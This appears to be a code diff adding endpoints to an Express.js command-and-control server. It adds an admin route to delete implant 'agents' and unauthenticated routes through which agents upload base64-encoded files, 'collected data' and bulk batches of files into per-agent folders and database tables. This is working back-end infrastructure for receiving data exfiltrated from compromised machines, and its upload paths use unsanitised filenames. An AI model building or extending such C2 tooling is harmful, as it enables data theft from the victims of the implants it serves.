@@ -1126,6 +1126,180 @@ app.post('/api/admin/c2/kill/:agentId', authenticateAdmin, async (req, res) => {
     }
 });
 
+// 8.5. Delete Agent (Admin)
+app.delete('/api/admin/c2/agents/:agentId', authenticateAdmin, async (req, res) => {
+    const { agentId } = req.params;
+    
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    try {
+        // Check if agent exists
+        const [agent] = await pool.query("SELECT * FROM c2_agents WHERE agent_id = ?", [agentId]);
+        if (agent.length === 0) {
+            return res.status(404).json({ error: `Agent with ID ${agentId} not found.` });
+        }
+
+        // Delete the agent (this will cascade delete related commands and results)
+        const [result] = await pool.query(
+            "DELETE FROM c2_agents WHERE agent_id = ?",
+            [agentId]
+        );
+
+        // Also delete any uploaded files for this agent
+        const uploadDir = path.join(__dirname, 'uploads', 'c2', agentId);
+        if (fs.existsSync(uploadDir)) {
+            fs.rmSync(uploadDir, { recursive: true, force: true });
+        }
+
+        res.json({ 
+            status: 'success', 
+            message: `Agent ${agentId} has been permanently deleted`,
+            deleted_agent: agent[0]
+        });
+    } catch (error) {
+        console.error('Error deleting agent:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 9. File Upload Endpoint
+app.post('/api/c2/upload/:agentId', async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    const { agentId } = req.params;
+    const { filename, file_data, file_type, command_id } = req.body;
+
+    if (!filename || !file_data) {
+        return res.status(400).json({ error: "Filename and file_data are required" });
+    }
+
+    try {
+        // Create uploads directory if it doesn't exist
+        const uploadDir = path.join(__dirname, 'uploads', 'c2', agentId);
+        if (!fs.existsSync(uploadDir)) {
+            fs.mkdirSync(uploadDir, { recursive: true });
+        }
+
+        // Decode base64 file data
+        const fileBuffer = Buffer.from(file_data, 'base64');
+        const filePath = path.join(uploadDir, filename);
+
+        // Write file
+        fs.writeFileSync(filePath, fileBuffer);
+
+        // Log file upload in database
+        await pool.query(
+            `INSERT INTO c2_results (command_id, agent_id, result_data, file_path, file_size, success)
+             VALUES (?, ?, ?, ?, ?, ?)`,
+            [command_id, agentId, JSON.stringify({ message: "File uploaded successfully" }), filePath, fileBuffer.length, true]
+        );
+
+        res.json({ 
+            status: 'success', 
+            message: 'File uploaded successfully',
+            file_path: filePath,
+            file_size: fileBuffer.length
+        });
+    } catch (error) {
+        console.error('Error uploading file:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 10. Data Collection Endpoint
+app.post('/api/c2/data/:agentId', async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    const { agentId } = req.params;
+    const { data_type, content, timestamp } = req.body;
+
+    if (!data_type || !content) {
+        return res.status(400).json({ error: "data_type and content are required" });
+    }
+
+    try {
+        // Store collected data in database
+        await pool.query(
+            `INSERT INTO c2_results (agent_id, result_data, success)
+             VALUES (?, ?, ?)`,
+            [agentId, JSON.stringify({ data_type, content, timestamp }), true]
+        );
+
+        res.json({ 
+            status: 'success', 
+            message: 'Data collected successfully'
+        });
+    } catch (error) {
+        console.error('Error storing collected data:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 11. Bulk Upload Endpoint
+app.post('/api/c2/bulk-upload/:agentId', async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    const { agentId } = req.params;
+    const { files, data_collection } = req.body;
+
+    try {
+        const results = [];
+
+        // Handle file uploads
+        if (files && Array.isArray(files)) {
+            const uploadDir = path.join(__dirname, 'uploads', 'c2', agentId);
+            if (!fs.existsSync(uploadDir)) {
+                fs.mkdirSync(uploadDir, { recursive: true });
+            }
+
+            for (const file of files) {
+                if (file.filename && file.data) {
+                    const fileBuffer = Buffer.from(file.data, 'base64');
+                    const filePath = path.join(uploadDir, file.filename);
+                    
+                    fs.writeFileSync(filePath, fileBuffer);
+                    
+                    results.push({
+                        type: 'file',
+                        filename: file.filename,
+                        file_path: filePath,
+                        file_size: fileBuffer.length,
+                        success: true
+                    });
+                }
+            }
+        }
+
+        // Handle data collection
+        if (data_collection && Array.isArray(data_collection)) {
+            for (const data of data_collection) {
+                if (data.type && data.content) {
+                    await pool.query(
+                        `INSERT INTO c2_results (agent_id, result_data, success)
+                         VALUES (?, ?, ?)`,
+                        [agentId, JSON.stringify(data), true]
+                    );
+                    
+                    results.push({
+                        type: 'data',
+                        data_type: data.type,
+                        success: true
+                    });
+                }
+            }
+        }
+
+        res.json({ 
+            status: 'success', 
+            message: 'Bulk upload completed',
+            results: results
+        });
+    } catch (error) {
+        console.error('Error during bulk upload:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
 // Fallback route for SPA
 app.get('*', (req, res) => {
     res.sendFile(path.resolve('../dist/index.html'));
